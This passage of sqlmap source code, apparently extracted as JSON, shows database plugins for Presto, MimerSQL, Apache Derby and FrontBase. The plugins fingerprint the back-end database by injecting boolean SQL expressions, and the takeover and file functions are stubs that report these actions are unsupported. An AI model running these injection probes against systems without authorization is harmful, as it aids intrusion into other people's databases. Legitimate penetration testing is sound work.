\"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(PRESTO_ALIASES):\n            setDbms(DBMS.PRESTO)\n\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.PRESTO\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"TO_BASE64URL(NULL) IS NULL\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.PRESTO\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"TO_HEX(FROM_HEX(NULL)) IS NULL\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.PRESTO\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.PRESTO)\n\n            if not conf.extensiveFp:\n                return True\n\n            infoMsg = \"actively fingerprinting %s\" % DBMS.PRESTO\n            logger.info(infoMsg)\n\n            # Reference: https://prestodb.io/docs/current/release/release-0.200.html\n            if inject.checkBooleanExpression(\"FROM_IEEE754_32(NULL) IS NULL\"):\n                Backend.setVersion(\">= 0.200\")\n            # Reference: https://prestodb.io/docs/current/release/release-0.193.html\n            elif inject.checkBooleanExpression(\"NORMAL_CDF(NULL,NULL,NULL) IS NULL\"):\n                Backend.setVersion(\">= 0.193\")\n            # Reference: https://prestodb.io/docs/current/release/release-0.183.html\n            elif inject.checkBooleanExpression(\"MAP_ENTRIES(NULL) IS NULL\"):\n                Backend.setVersion(\">= 0.183\")\n            # Reference: https://prestodb.io/docs/current/release/release-0.171.html\n            elif inject.checkBooleanExpression(\"CODEPOINT(NULL) IS NULL\"):\n                Backend.setVersion(\">= 0.171\")\n            # Reference: https://prestodb.io/docs/current/release/release-0.162.html\n            elif inject.checkBooleanExpression(\"XXHASH64(NULL) IS NULL\"):\n                Backend.setVersion(\">= 0.162\")\n            # Reference: https://prestodb.io/docs/current/release/release-0.151.html\n            elif inject.checkBooleanExpression(\"COSINE_SIMILARITY(NULL,NULL) IS NULL\"):\n                Backend.setVersion(\">= 0.151\")\n            # Reference: https://prestodb.io/docs/current/release/release-0.143.html\n            elif inject.checkBooleanExpression(\"TRUNCATE(NULL) IS NULL\"):\n                Backend.setVersion(\">= 0.143\")\n            # Reference: https://prestodb.io/docs/current/release/release-0.137.html\n            elif inject.checkBooleanExpression(\"BIT_COUNT(NULL,NULL) IS NULL\"):\n                Backend.setVersion(\">= 0.137\")\n            # Reference: https://prestodb.io/docs/current/release/release-0.130.html\n            elif inject.checkBooleanExpression(\"MAP_CONCAT(NULL,NULL) IS NULL\"):\n                Backend.setVersion(\">= 0.130\")\n            # Reference: https://prestodb.io/docs/current/release/release-0.115.html\n            elif inject.checkBooleanExpression(\"SHA1(NULL) IS NULL\"):\n                Backend.setVersion(\">= 0.115\")\n            # Reference: https://prestodb.io/docs/current/release/release-0.100.html\n            elif inject.checkBooleanExpression(\"SPLIT(NULL,NULL) IS NULL\"):\n                Backend.setVersion(\">= 0.100\")\n            # Reference: https://prestodb.io/docs/current/release/release-0.70.html\n            elif inject.checkBooleanExpression(\"GREATEST(NULL,NULL) IS NULL\"):\n                Backend.setVersion(\">= 0.70\")\n            else:\n                Backend.setVersion(\"< 0.100\")\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.PRESTO\n            logger.warning(warnMsg)\n\n            return False\n", "plugins/dbms/presto/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Presto it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on Presto it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on Presto it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on Presto it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/presto/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on Presto it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on Presto it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/presto/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import PRESTO_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\n\nfrom plugins.dbms.presto.enumeration import Enumeration\nfrom plugins.dbms.presto.filesystem import Filesystem\nfrom plugins.dbms.presto.fingerprint import Fingerprint\nfrom plugins.dbms.presto.syntax import Syntax\nfrom plugins.dbms.presto.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass PrestoMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines Presto methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = PRESTO_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.PRESTO] = Syntax.escape\n", "plugins/dbms/mimersql/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getPasswordHashes(self):\n        warnMsg = \"on MimerSQL it is not possible to enumerate password hashes\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getStatements(self):\n        warnMsg = \"on MimerSQL it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def getRoles(self, *args, **kwargs):\n        warnMsg = \"on MimerSQL it is not possible to enumerate the user roles\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getHostname(self):\n        warnMsg = \"on MimerSQL it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n", "plugins/dbms/mimersql/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import mimerpy\nexcept:\n    pass\n\nimport logging\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/mimersql/MimerPy\n    User guide: https://github.com/mimersql/MimerPy/blob/master/README.rst\n    API: https://www.python.org/dev/peps/pep-0249/\n    License: MIT\n    \"\"\"\n\n    def connect(self):\n        self.initConnection()\n\n        try:\n            self.connector = mimerpy.connect(hostname=self.hostname, username=self.user, password=self.password, database=self.db, port=self.port, connect_timeout=conf.timeout)\n        except mimerpy.OperationalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except mimerpy.ProgrammingError as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n            return None\n\n    def execute(self, query):\n        try:\n            self.cursor.execute(query)\n        except (mimerpy.OperationalError, mimerpy.ProgrammingError) as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n        except mimerpy.InternalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.connector.commit()\n\n    def select(self, query):\n        self.execute(query)\n        return self.fetchall()\n", "plugins/dbms/mimersql/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> from lib.core.common import Backend\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT UNICODE_CHAR(97)||UNICODE_CHAR(98)||UNICODE_CHAR(99)||UNICODE_CHAR(100)||UNICODE_CHAR(101)||UNICODE_CHAR(102)||UNICODE_CHAR(103)||UNICODE_CHAR(104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"||\".join(\"UNICODE_CHAR(%d)\" % _ for _ in getOrds(value))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/mimersql/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import MIMERSQL_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.MIMERSQL)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.MIMERSQL\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(MIMERSQL_ALIASES):\n            setDbms(DBMS.MIMERSQL)\n\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.MIMERSQL\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"IRAND()>=0\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.MIMERSQL\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"PASTE('[RANDSTR1]',0,0,'[RANDSTR2]')='[RANDSTR2][RANDSTR1]'\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.MIMERSQL\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.MIMERSQL)\n\n            self.getBanner()\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.MIMERSQL\n            logger.warning(warnMsg)\n\n            return False\n", "plugins/dbms/mimersql/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on MimerSQL it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on MimerSQL it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on MimerSQL it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on MimerSQL it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/mimersql/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    pass\n", "plugins/dbms/mimersql/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import MIMERSQL_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\n\nfrom plugins.dbms.mimersql.enumeration import Enumeration\nfrom plugins.dbms.mimersql.filesystem import Filesystem\nfrom plugins.dbms.mimersql.fingerprint import Fingerprint\nfrom plugins.dbms.mimersql.syntax import Syntax\nfrom plugins.dbms.mimersql.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass MimerSQLMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines MimerSQL methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = MIMERSQL_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.MIMERSQL] = Syntax.escape\n", "plugins/dbms/derby/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.data import logger\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getPasswordHashes(self):\n        warnMsg = \"on Apache Derby it is not possible to enumerate password hashes\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getStatements(self):\n        warnMsg = \"on Apache Derby it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on Apache Derby it is not possible to enumerate the user privileges\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getRoles(self, *args, **kwargs):\n        warnMsg = \"on Apache Derby it is not possible to enumerate the user roles\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getHostname(self):\n        warnMsg = \"on Apache Derby it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n\n    def getBanner(self):\n        warnMsg = \"on Apache Derby it is not possible to enumerate the banner\"\n        singleTimeWarnMessage(warnMsg)\n", "plugins/dbms/derby/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import drda\nexcept:\n    pass\n\nimport logging\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/nakagami/pydrda/\n    User guide: https://github.com/nakagami/pydrda/blob/master/README.rst\n    API: https://www.python.org/dev/peps/pep-0249/\n    License: MIT\n    \"\"\"\n\n    def connect(self):\n        self.initConnection()\n\n        try:\n            self.connector = drda.connect(host=self.hostname, database=self.db, port=self.port)\n        except drda.OperationalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except drda.ProgrammingError as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n            return None\n\n    def execute(self, query):\n        try:\n            self.cursor.execute(query)\n        except (drda.OperationalError, drda.ProgrammingError) as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n        except drda.InternalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        try:\n            self.connector.commit()\n        except drda.OperationalError:\n            pass\n\n    def select(self, query):\n        self.execute(query)\n        return self.fetchall()\n", "plugins/dbms/derby/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT 'abcdefgh' FROM foobar\"\n        True\n        \"\"\"\n\n        return expression\n", "plugins/dbms/derby/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import DERBY_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.DERBY)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.DERBY\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(DERBY_ALIASES):\n            setDbms(DBMS.DERBY)\n\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.DERBY\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"[RANDNUM]=(SELECT [RANDNUM] FROM SYSIBM.SYSDUMMY1 OFFSET 0 ROWS FETCH FIRST 1 ROW ONLY)\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.DERBY\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"(SELECT CURRENT SCHEMA FROM SYSIBM.SYSDUMMY1) IS NOT NULL\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.DERBY\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.DERBY)\n\n            self.getBanner()\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.DERBY\n            logger.warning(warnMsg)\n\n            return False\n", "plugins/dbms/derby/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Apache Derby it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on Apache Derby it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on Apache Derby it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on Apache Derby it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/derby/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    pass\n", "plugins/dbms/derby/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import DERBY_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\n\nfrom plugins.dbms.derby.enumeration import Enumeration\nfrom plugins.dbms.derby.filesystem import Filesystem\nfrom plugins.dbms.derby.fingerprint import Fingerprint\nfrom plugins.dbms.derby.syntax import Syntax\nfrom plugins.dbms.derby.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass DerbyMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines Apache Derby methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = DERBY_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.DERBY] = Syntax.escape\n", "plugins/dbms/frontbase/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getBanner(self):\n        warnMsg = \"on FrontBase it is not possible to get the banner\"\n        logger.warning(warnMsg)\n\n        return None\n\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on FrontBase it is not possible to enumerate the user privileges\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getHostname(self):\n        warnMsg = \"on FrontBase it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n\n    def getStatements(self):\n        warnMsg = \"on FrontBase it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n", "plugins/dbms/frontbase/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    def connect(self):\n        errMsg = \"on FrontBase it is not (currently) possible to establish a \"\n        errMsg += \"direct connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/frontbase/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT 'abcdefgh' FROM foobar\"\n        True\n        \"\"\"\n\n        return expression\n", "plugins/dbms/frontbase/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import FRONTBASE_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.FRONTBASE)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.FRONTBASE\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(FRONTBASE_ALIASES):\n            setDbms(DBMS.FRONTBASE)\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.FRONTBASE\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"(SELECT degradedTransactions FROM INFORMATION_SCHEMA.IO_STATISTICS)>=0\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.FRONTBASE\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"(SELECT TOP (0,1) file_version FROM INFORMATION_SCHEMA.FRAGMENTATION)>=0\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.FRONTBASE\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.FRONTBASE)\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.FRONTBASE\n            logger.warning(warnMsg)\n\n            return False\n", "plugins/dbms/frontbase/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on FrontBase it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on FrontBase it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on FrontBase it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on FrontBase it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/frontbase/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on FrontBase it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on FrontBase it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/frontbase/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import FRONTBASE_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\nfrom plugins.dbms.frontbase.enumeration import 